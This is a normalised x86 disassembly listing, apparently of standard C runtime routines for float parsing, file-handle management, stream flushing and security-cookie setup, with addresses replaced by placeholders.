or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
mov eax esi
call sub_430016
mov [ rw-data ] eax
mov [ rw-data ] edi
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
jmp r-xdata
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax edx
jbe r-xdata
or [ eax + rw-data ] 0x4
inc eax
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
sub_43040a
mov ecx [ rw-data ]
mov eax rw-data
push esi
lea ecx [ ecx + ecx * 2 ]
lea ecx [ ecx * 4 + rw-data ]
cmp eax ecx
pop esi
jae r-xdata
lea esi [ ecx + ecx * 2 ]
add eax 0xc
lea esi [ esi * 4 + rw-data ]
cmp eax esi
jb r-xdata
xor eax eax
cmp [ eax + 0x4 ] edx
je r-xdata
cmp [ eax + 0x4 ] edx
je r-xdata
retn
sub_430443
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax edi
dec eax
dec eax
je r-xdata
mov esi [ rw-data ]
mov eax rw-data
dec eax
dec eax
je r-xdata
xor eax eax
test esi esi
jne r-xdata
mov edx edi
call sub_43040a
add eax 0x8
mov esi [ eax ]
jmp r-xdata
sub eax 0x4
je r-xdata
push ebx
push 0x8
pop ecx
cmp edi ecx
je r-xdata
push 0x3
call sub_42bc85
cmp esi 0x1
je r-xdata
sub eax 0x3
je r-xdata
mov ebx [ rw-data ]
and [ rw-data ] 0x0
cmp edi ecx
jne r-xdata
cmp edi 0xb
je r-xdata
sub eax 0x4
je r-xdata
and [ eax ] 0x0
cmp edi ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ebp + 0x8 ] edx
mov [ rw-data ] 0x8c
jmp r-xdata
cmp edi 0x4
jne r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
sub eax 0x6
je r-xdata
push edi
call esi
cmp edi 0xb
pop ecx
je r-xdata
push [ rw-data ]
push 0x8
call esi
pop ecx
pop ecx
jmp r-xdata
cmp edi ecx
jne r-xdata
mov ebx [ ebp + 0x8 ]
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
dec eax
je r-xdata
cmp edi 0x8
mov [ rw-data ] ebx
jne r-xdata
cmp edi 0x4
jne r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
add ecx eax
cmp eax ecx
jge r-xdata
mov esi [ rw-data ]
mov eax rw-data
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
lea edx [ eax + eax * 2 ]
lea edx [ edx * 4 + rw-data ]
sub ecx eax
pop edi
pop esi
pop ebp
retn
and [ edx ] 0x0
add edx 0xc
dec ecx
jne r-xdata
jmp r-xdata
sub_43056c
push esi
mov esi [ esp + 0x8 ]
jmp r-xdata
movzx eax [ esi ]
push eax
call sub_43153d
test eax eax
pop ecx
jne r-xdata
inc esi
movzx ecx [ esi ]
inc esi
cmp ecx 0x2d
mov edx ecx
je r-xdata
movzx ecx [ esi ]
inc esi
cmp ecx 0x2b
jne r-xdata
or ecx 0xffffffff
cmp ecx 0x39
jg r-xdata
xor eax eax
cmp edx 0x2d
pop esi
jne r-xdata
lea eax [ eax + eax * 4 ]
lea eax [ ecx + eax * 2 ]
movzx ecx [ esi ]
inc esi
jmp r-xdata
sub ecx 0x30
jmp r-xdata
retn
neg eax
cmp ecx 0x30
jl r-xdata
cmp ecx 0xffffffff
je r-xdata
sub_4305c4
mov edx [ esp + 0x4 ]
push esi
mov esi [ esp + 0xc ]
lea ecx [ edx + esi ]
xor eax eax
cmp ecx edx
jb r-xdata
xor eax eax
inc eax
cmp ecx esi
jae r-xdata
mov edx [ esp + 0x10 ]
mov [ edx ] ecx
pop esi
retn
sub_4305e5
push esi
mov esi [ esp + 0x8 ]
push edi
mov edi [ esp + 0x10 ]
push esi
push [ edi ]
push [ esi ]
call sub_4305c4
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push [ edi + 0x4 ]
push [ eax ]
call sub_4305c4
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x4 ]
push eax
push 0x1
push [ eax ]
call sub_4305c4
add esp 0xc
test eax eax
je r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x8 ]
push [ eax ]
call sub_4305c4
add esp 0xc
pop edi
pop esi
retn
inc [ esi + 0x8 ]
inc [ esi + 0x8 ]
sub_430643
mov eax [ esp + 0x4 ]
push esi
mov esi [ eax ]
mov ecx esi
add esi esi
push edi
mov edi [ eax + 0x4 ]
shr ecx 0x1f
mov [ eax ] esi
lea esi [ edi + edi ]
or esi ecx
mov ecx [ eax + 0x8 ]
mov edx edi
shr edx 0x1f
shl ecx 0x1
or ecx edx
pop edi
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] ecx
pop esi
retn
sub_430671
mov eax [ esp + 0x4 ]
mov edx [ eax + 0x8 ]
mov ecx [ eax + 0x4 ]
push esi
push edi
mov edi ecx
mov esi edx
shr ecx 0x1
shl esi 0x1f
or ecx esi
mov [ eax + 0x4 ] ecx
mov ecx [ eax ]
shl edi 0x1f
shr ecx 0x1
or ecx edi
shr edx 0x1
pop edi
mov [ eax + 0x8 ] edx
mov [ eax ] ecx
pop esi
retn
sub_43069e
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov ebx [ ebp + 0x10 ]
xor edx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
cmp eax edx
push esi
push edi
mov [ ebp - 0x8 ] 0x404e
mov [ ebx ] edx
mov [ ebx + 0x4 ] edx
mov [ ebx + 0x8 ] edx
jbe r-xdata
cmp [ ebx + 0x8 ] edx
jne r-xdata
mov [ ebp + 0x10 ] eax
mov esi 0x8000
jmp r-xdata
mov edi [ ebx + 0x8 ]
mov esi ebx
lea edi [ ebp - 0x14 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push ebx
movsd [ edi ] [ esi ]
call sub_430643
push ebx
call sub_430643
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_4305e5
push ebx
call sub_430643
mov eax [ ebp + 0x8 ]
movsx eax [ eax ]
and [ ebp - 0x10 ] 0x0
and [ ebp - 0xc ] 0x0
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x14 ]
push eax
push ebx
call sub_4305e5
add esp 0x1c
inc [ ebp + 0x8 ]
dec [ ebp + 0x10 ]
jne r-xdata
xor edx edx
test [ ebx + 0x8 ] esi
je r-xdata
mov ecx [ ebx + 0x4 ]
add [ ebp - 0x8 ] 0xfff0
mov eax ecx
shr eax 0x10
mov edi eax
mov eax [ ebx ]
mov esi eax
shr esi 0x10
shl ecx 0x10
or esi ecx
shl eax 0x10
cmp edi edx
mov [ ebx + 0x4 ] esi
mov [ ebx ] eax
je r-xdata
mov [ ebx + 0x8 ] edi
push ebx
call sub_430643
add [ ebp - 0x8 ] 0xffff
pop ecx
mov ecx [ ebp - 0x4 ]
mov ax [ ebp - 0x8 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
mov [ ebx + 0xa ] ax
pop ebx
call sub_42fac0
leave
retn
sub_430782
push ebp
mov ebp esp
sub esp 0x58
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x58 ]
push esi
mov [ ebp - 0x10 ] eax
xor eax eax
xor edx edx
push edi
mov edi [ ebp + 0x10 ]
inc edx
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x1c ] edx
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x18 ] eax
mov [ ebp + 0x10 ] edi
inc edi
jmp r-xdata
cmp cl 0x9
je r-xdata
mov cl [ edi ]
cmp cl 0x20
je r-xdata
cmp cl 0xa
je r-xdata
cmp cl 0xd
jne r-xdata
push 0x4
pop esi
cmp eax 0xa
jne r-xdata
jmp [ eax * 4 + jump_table_430bdf ]
mov bl [ edi ]
inc edi
cmp eax 0xb
ja r-xdata
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp bl 0x31
mov [ ebp - 0x14 ] edx
jl r-xdata
cmp bl 0x31
jl r-xdata
mov [ ebp - 0x14 ] edx
cmp [ ebp - 0x8 ] 0x0
mov [ ebp - 0x14 ] edx
mov [ ebp - 0x28 ] edx
jne r-xdata
cmp [ rw-data ] edx
mov [ ebp - 0x28 ] edx
movzx eax bl
jle r-xdata
cmp bl 0x31
lea ecx [ edi - 0x2 ]
mov [ ebp + 0x10 ] ecx
jl r-xdata
mov [ ebp - 0x24 ] edx
jmp r-xdata
cmp bl 0x31
jl r-xdata
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov [ ebp - 0x24 ] 0x1
xor esi esi
cmp [ ebp - 0x14 ] 0x0
mov eax [ ebp + 0xc ]
mov [ eax ] edi
je r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp bl 0x39
jg r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl [ rw-data ]
je r-xdata
cmp bl 0x39
jle r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax esi
push esi
push eax
call sub_42c0a8
pop ecx
xor edx edx
pop ecx
inc edx
jmp r-xdata
cmp [ rw-data ] edx
movzx eax bl
jle r-xdata
jmp r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax esi
push esi
push eax
call sub_42c0a8
pop ecx
xor edx edx
pop ecx
inc edx
jmp r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
cmp bl 0x39
jle r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x39
jg r-xdata
push 0xa
pop eax
dec edi
movsx eax bl
sub eax 0x2b
lea ecx [ edi - 0x1 ]
mov [ ebp + 0x10 ] ecx
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
push 0x4
push eax
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
mov [ ebp - 0x18 ] 0x4
jmp r-xdata
push 0x18
pop eax
cmp [ ebp - 0x8 ] eax
jbe r-xdata
movsx eax bl
sub eax 0x2b
je r-xdata
push 0x5
jmp r-xdata
push 0x3
jmp r-xdata
mov eax esi
jmp r-xdata
cmp bl 0x2b
je r-xdata
cmp bl 0x30
jne r-xdata
cmp bl [ rw-data ]
jne r-xdata
cmp [ ebp - 0x8 ] 0x19
jae r-xdata
test eax eax
je r-xdata
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax esi
push esi
push eax
call sub_42c0a8
pop ecx
xor edx edx
pop ecx
inc edx
jmp r-xdata
cmp bl 0x30
je r-xdata
mov edi [ ebp + 0x10 ]
jmp r-xdata
mov eax esi
jmp r-xdata
test eax eax
je r-xdata
push 0x7
dec eax
dec eax
je r-xdata
push 0x9
mov bl [ edi ]
inc edi
cmp bl 0x31
jl r-xdata
push 0x8
jmp r-xdata
dec eax
dec eax
jne r-xdata
mov [ ebp - 0x20 ] esi
movsx ecx bl
lea eax [ esi + esi * 4 ]
lea esi [ ecx + eax * 2 - 0x30 ]
cmp esi 0x1450
jg r-xdata
test eax eax
je r-xdata
xor edx edx
xor eax eax
xor esi esi
xor ebx ebx
mov eax [ ebp - 0x10 ]
cmp [ ebp - 0x41 ] 0x5
jl r-xdata
and [ ebp - 0x2c ] 0x0
push 0x2
pop eax
jmp r-xdata
dec eax
dec eax
je r-xdata
pop eax
jmp r-xdata
pop eax
dec edi
push 0xb
jmp r-xdata
cmp bl 0x2d
je r-xdata
mov eax edx
jmp r-xdata
cmp bl 0x2b
je r-xdata
inc [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
inc [ ebp - 0x8 ]
sub bl 0x30
inc [ ebp - 0x10 ]
mov [ eax ] bl
jmp r-xdata
cmp [ ebp - 0x8 ] 0x19
jae r-xdata
test eax eax
je r-xdata
dec [ ebp - 0xc ]
mov bl [ edi ]
inc edi
dec edi
jmp r-xdata
or [ ebp - 0x1c ] 0xffffffff
push 0x7
pop eax
jmp r-xdata
sub eax 0x3
jne r-xdata
dec edi
jmp r-xdata
cmp bl 0x39
jg r-xdata
mov edi ecx
mov ecx [ rw-data ]
movzx eax [ ecx + eax * 2 ]
and eax 0x4
push 0x4
push eax
call sub_42c0a8
pop ecx
pop ecx
jmp r-xdata
mov esi 0x1451
mov bl [ edi ]
inc edi
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x10 ]
dec eax
inc [ ebp - 0xc ]
jmp r-xdata
inc [ ebp - 0x41 ]
push 0x2
pop eax
mov [ ebp - 0x2c ] 0x8000
jmp r-xdata
sub eax 0x3
je r-xdata
cmp bl 0x30
je r-xdata
cmp bl 0x2d
je r-xdata
cmp [ rw-data ] edx
movzx eax bl
jle r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
sub bl 0x30
inc [ ebp - 0x10 ]
dec [ ebp - 0xc ]
mov [ eax ] bl
jmp r-xdata
mov bl [ edi ]
inc edi
jmp r-xdata
test eax eax
je r-xdata
cmp [ rw-data ] 0x1
movzx eax bl
jle r-xdata
dec eax
cmp [ eax ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jbe r-xdata
cmp bl 0x43
jle r-xdata
jmp r-xdata
cmp [ rw-data ] 0x1
movzx eax bl
jle r-xdata
dec [ ebp - 0x8 ]
inc [ ebp - 0xc ]
lea eax [ ebp - 0x3c ]
push eax
push [ ebp - 0x8 ]
lea eax [ ebp - 0x58 ]
push eax
call sub_43069e
mov eax [ ebp - 0x20 ]
xor ecx ecx
add esp 0xc
cmp [ ebp - 0x1c ] ecx
jge r-xdata
cmp bl 0x45
jle r-xdata
add eax [ ebp - 0xc ]
cmp [ ebp - 0x24 ] ecx
jne r-xdata
neg eax
push 0x6
jmp r-xdata
cmp bl 0x63
jle r-xdata
cmp [ ebp - 0x28 ] ecx
jne r-xdata
add eax [ ebp + 0x18 ]
cmp bl 0x65
jg r-xdata
cmp eax 0x1450
jg r-xdata
sub eax [ ebp + 0x1c ]
xor ebx ebx
mov eax 0x7fff
mov esi 0x80000000
xor edx edx
mov [ ebp - 0x18 ] 0x2
jmp r-xdata
cmp eax 0xffffebb0
jl r-xdata
mov ecx [ ebp + 0x8 ]
or eax [ ebp - 0x2c ]
mov [ ecx + 0x2 ] ebx
mov [ ecx + 0x6 ] esi
mov [ ecx + 0xa ] ax
mov eax [ ebp - 0x18 ]
mov [ ecx ] dx
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_42fac0
leave
retn
mov [ ebp - 0x18 ] 0x1
push [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x3c ]
push eax
call sub_431805
mov edx [ ebp - 0x3c ]
mov ebx [ ebp - 0x3a ]
mov esi [ ebp - 0x36 ]
mov eax [ ebp - 0x32 ]
add esp 0xc
jmp r-xdata
sub_430c0f
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
push ebx
mov ebx [ ebp + 0x1c ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
push esi
mov ecx eax
mov esi 0x7fff
and ecx 0x8000
and eax esi
test cx cx
push edi
mov [ ebp - 0x24 ] 0xcc
mov [ ebp - 0x23 ] 0xcc
mov [ ebp - 0x22 ] 0xcc
mov [ ebp - 0x21 ] 0xcc
mov [ ebp - 0x20 ] 0xcc
mov [ ebp - 0x1f ] 0xcc
mov [ ebp - 0x1e ] 0xcc
mov [ ebp - 0x1d ] 0xcc
mov [ ebp - 0x1c ] 0xcc
mov [ ebp - 0x1b ] 0xcc
mov [ ebp - 0x1a ] 0xfb
mov [ ebp - 0x19 ] 0x3f
mov [ ebp - 0x8 ] 0x1
mov edx eax
je r-xdata
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x2 ] 0x2d
jmp r-xdata
cmp dx si
jne r-xdata
test edi edi
jne r-xdata
test dx dx
mov edi [ ebp + 0xc ]
jne r-xdata
movzx eax dx
mov esi eax
imul eax eax 0x4d10
and [ ebp - 0x18 ] 0x0
mov ecx edi
shr ecx 0x18
shr esi 0x8
lea ecx [ esi + ecx * 2 ]
imul ecx ecx 0x4d
lea esi [ ecx + eax - 0x134312f4 ]
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x16 ] eax
sar esi 0x10
movsx eax si
neg eax
push 0x1
push eax
lea eax [ ebp - 0x18 ]
push eax
mov [ ebp - 0xe ] dx
mov [ ebp - 0x12 ] edi
call sub_431805
add esp 0xc
cmp [ ebp - 0xe ] 0x3fff
jb r-xdata
mov eax 0x80000000
cmp edi eax
mov [ ebx ] 0x1
jne r-xdata
cmp [ ebp + 0x8 ] edi
je r-xdata
test [ ebp + 0x18 ] 0x1
mov edi [ ebp + 0x14 ]
mov [ ebx ] si
je r-xdata
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
inc esi
call sub_4315cd
pop ecx
pop ecx
test edi 0x40000000
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ ebx + 0x4 ] 0x30
jmp r-xdata
cmp edi 0x15
jle r-xdata
movsx eax si
add edi eax
test edi edi
jg r-xdata
test cx cx
je r-xdata
push r--data
jmp r-xdata
and [ ebx ] 0x0
and [ ebx + 0x5 ] 0x0
xor eax eax
mov [ ebx + 0x2 ] 0x20
mov [ ebx + 0x3 ] 0x1
inc eax
jmp r-xdata
movzx esi [ ebp - 0xe ]
sub esi 0x3ffe
and [ ebp - 0xe ] 0x0
mov [ ebp + 0x10 ] 0x8
push 0x15
pop edi
cmp edi eax
jne r-xdata
cmp edi 0xc0000000
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_42f2b0
mov [ ebx + 0x3 ] 0x6
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx [ ebp + 0x4 ]
pop edi
pop esi
pop ebx
call sub_42fac0
leave
retn
lea eax [ ebp - 0x18 ]
push eax
call sub_430643
dec [ ebp + 0x10 ]
pop ecx
jne r-xdata
test esi esi
jge r-xdata
push r--data
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
and [ ebp - 0x8 ] 0x0
pop ecx
pop ecx
jmp r-xdata
lea ecx [ edi + 0x1 ]
test ecx ecx
lea eax [ ebx + 0x4 ]
mov [ ebp + 0x10 ] eax
jle r-xdata
neg esi
and esi 0xff
jle r-xdata
push r--data
push r--data
jmp r-xdata
mov eax [ ebp - 0x8 ]
dec eax
mov cl [ eax ]
dec eax
cmp cl 0x35
lea ecx [ ebx + 0x4 ]
jl r-xdata
mov [ ebp - 0xc ] ecx
lea eax [ ebp - 0x18 ]
push eax
call sub_430671
dec esi
pop ecx
jne r-xdata
lea eax [ ebx + 0x4 ]
push eax
call sub_42f2b0
mov [ ebx + 0x3 ] 0x5
cmp eax ecx
jae r-xdata
jmp r-xdata
lea esi [ ebp - 0x18 ]
lea edi [ ebp - 0x30 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x18 ]
push eax
movsd [ edi ] [ esi ]
call sub_430643
lea eax [ ebp - 0x18 ]
push eax
call sub_430643
lea eax [ ebp - 0x30 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
call sub_4305e5
lea eax [ ebp - 0x18 ]
push eax
call sub_430643
mov al [ ebp - 0xd ]
mov ecx [ ebp + 0x10 ]
and [ ebp - 0xd ] 0x0
add al 0x30
add esp 0x14
inc [ ebp + 0x10 ]
dec [ ebp - 0xc ]
mov [ ecx ] al
jne r-xdata
mov eax [ ebp + 0x10 ]
cmp [ eax ] 0x30
jne r-xdata
cmp eax ecx
jae r-xdata
cmp eax ecx
jae r-xdata
dec eax
sub al bl
sub al 0x3
mov [ ebx + 0x3 ] al
movsx eax al
and [ eax + ebx + 0x4 ] 0x0
mov [ ecx ] 0x30
cmp [ eax ] 0x39
jne r-xdata
cmp eax ecx
jae r-xdata
mov [ eax ] 0x30
dec eax
inc [ eax ]
inc eax
inc [ ebx ]
sub_430ea3
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
xor ecx ecx
mov eax [ ecx * 8 + rw-data ]
mov [ rw-data ] eax
retn
inc ecx
cmp ecx 0x2d
jb r-xdata
cmp eax [ ecx * 8 + rw-data ]
je r-xdata
cmp eax 0x13
jb r-xdata
cmp eax 0xbc
jb r-xdata
cmp eax 0x24
ja r-xdata
mov [ rw-data ] 0x16
cmp eax 0xca
mov [ rw-data ] 0x8
jbe r-xdata
mov [ rw-data ] 0xd
retn
retn
sub_430f02
mov ecx [ esp + 0x4 ]
cmp ecx [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov eax ecx
sar eax 0x5
mov esi ecx
lea edi [ eax * 4 + rw-data ]
mov eax [ edi ]
and esi 0x1f
shl esi 0x3
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ esi + eax ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_430f7c
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
retn
mov ecx eax
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
and eax 0x1f
lea eax [ ecx + eax * 8 ]
test [ eax + 0x4 ] 0x1
je r-xdata
mov eax [ eax ]
retn
sub_430fb8
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x8 ]
cmp eax [ rw-data ]
push esi
push edi
jae r-xdata
and [ rw-data ] 0x0
mov ecx eax
sar ecx 0x5
mov esi eax
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
mov ecx [ edi ]
shl esi 0x3
test [ ecx + esi + 0x4 ] 0x1
je r-xdata
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x8 ] ecx
mov ecx [ ebp + 0x10 ]
push eax
mov [ ebp - 0x4 ] ecx
call sub_430f7c
cmp eax 0xffffffff
pop ecx
je r-xdata
mov [ rw-data ] 0x9
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp - 0x8 ]
push eax
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
jne r-xdata
mov eax [ edi ]
lea eax [ eax + esi + 0x4 ]
and [ eax ] 0xfd
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
jmp r-xdata
call [ GetLastError@IAT ]
test eax eax
je r-xdata
pop edi
pop esi
leave
retn
push eax
call sub_430ea3
pop ecx
jmp r-xdata
or eax 0xffffffff
or edx 0xffffffff
sub_431057
push esi
push edi
push 0x3
pop esi
xor edi edi
cmp [ rw-data ] esi
jle r-xdata
mov eax edi
pop edi
pop esi
retn
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
cmp esi 0x14
jl r-xdata
push eax
call sub_431891
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
call sub_429931
mov eax [ rw-data ]
and [ eax + esi * 4 ] 0x0
pop ecx
inc edi
sub_4310af
push ebx
push esi
mov esi [ esp + 0xc ]
mov eax [ esi + 0xc ]
mov ecx eax
and cl 0x3
xor ebx ebx
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop esi
mov eax ebx
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
push edi
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
pop edi
push edi
push eax
push [ esi + 0x10 ]
call sub_42f750
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al al
jns r-xdata
and eax 0xfffffffd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_43110c
push esi
mov esi [ esp + 0x8 ]
test esi esi
jne r-xdata
push esi
call sub_4310af
test eax eax
pop ecx
je r-xdata
push esi
call sub_431147
pop ecx
pop esi
retn
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_4318e7
pop ecx
neg eax
sbb eax eax
pop esi
retn
sub_431147
push ebx
push esi
push edi
xor esi esi
xor ebx ebx
xor edi edi
cmp [ rw-data ] esi
jle r-xdata
cmp [ esp + 0x10 ] 0x1
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_43110c
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_43110c
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_4311bd
push ebp
mov ebp esp
sub esp 0x10
push esi
lea eax [ ebp - 0x8 ]
push eax
call [ GetSystemTimeAsFileTime@IAT ]
mov esi [ ebp - 0x4 ]
xor esi [ ebp - 0x8 ]
call [ GetCurrentProcessId@IAT ]
xor esi eax
call [ GetCurrentThreadId@IAT ]
xor esi eax
call [ GetTickCount@IAT ]
xor esi eax
lea eax [ ebp - 0x10 ]
push eax
call [ QueryPerformanceCounter@IAT ]
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x10 ]
xor esi eax
mov [ rw-data ] esi
jne r-xdata
pop esi
leave
retn
mov [ rw-data ] 0xbb40e64e
sub_431213
push 0x118
push r--data
call sub_42a4d8
mov eax [ rw-data ]
xor eax [ ebp + 0x4 ]
mov [ ebp - 0x1c ] eax
mov eax [ rw-data ]
xor ecx ecx
cmp eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
dec eax
je r-xdata
mov [ ebp - 0x4 ] ecx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ecx
pop ecx
or [ ebp - 0x4 ] 0xffffffff
jmp r-xdata
mov edi r--data
mov [ ebp - 0x20 ] r--data
mov esi 0xb9
mov edi r--data
mov [ ebp - 0x20 ] r--data
mov esi 0xd4
jmp r-xdata
push 0x3
call sub_42bc85
int3
lea ebx [ ebp - 0x128 ]
lea eax [ ebp - 0x128 ]
push eax
call sub_42daa0
pop ecx
add eax 0xb
cmp eax 0x3c
jbe r-xdata
push r--data
lea eax [ ebp - 0x128 ]
push eax
call sub_42f2b0
pop ecx
pop ecx
mov [ ebp - 0x24 ] cl
push 0x104
lea eax [ ebp - 0x128 ]
push eax
push ecx
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
push ebx
call sub_42daa0
pop ecx
lea eax [ eax + esi + 0xc ]
add eax 0x3
and eax 0xfffffffc
call sub_42a0c0
mov [ ebp - 0x18 ] esp
mov esi esp
push edi
push esi
call sub_42f2b0
mov edi r--data
push edi
push esi
call sub_42f2c0
push r--data
push esi
call sub_42f2c0
push ebx
push esi
call sub_42f2c0
push edi
push esi
call sub_42f2c0
push [ ebp - 0x20 ]
push esi
call sub_42f2c0
push 0x12010
push r--data
push esi
call sub_42fdb4
add esp 0x3c
lea eax [ ebp - 0x128 ]
push eax
call sub_42daa0
mov ebx eax
lea eax [ ebp - 0x128 ]
sub eax 0x31
add ebx eax
push 0x3
push r--data
push ebx
call sub_42feb0
add esp 0x10
sub_43135d
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0x8 ]
cmp esi [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov eax esi
sar eax 0x5
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
and esi 0x1f
shl esi 0x3
add eax esi
mov dl [ eax + 0x4 ]
test dl 0x1
je r-xdata
and [ ebp - 0xc ] 0x0
cmp [ ebp + 0x10 ] 0x0
mov edi [ ebp + 0xc ]
mov ecx edi
je r-xdata
xor eax eax
jmp r-xdata
test dl 0x2
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
test dl 0x48
je r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push [ ebp + 0x10 ]
mov eax [ ebx ]
push ecx
push [ eax + esi ]
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
mov al [ eax + 0x5 ]
cmp al 0xa
je r-xdata
mov eax [ ebx ]
mov edx [ ebp - 0x10 ]
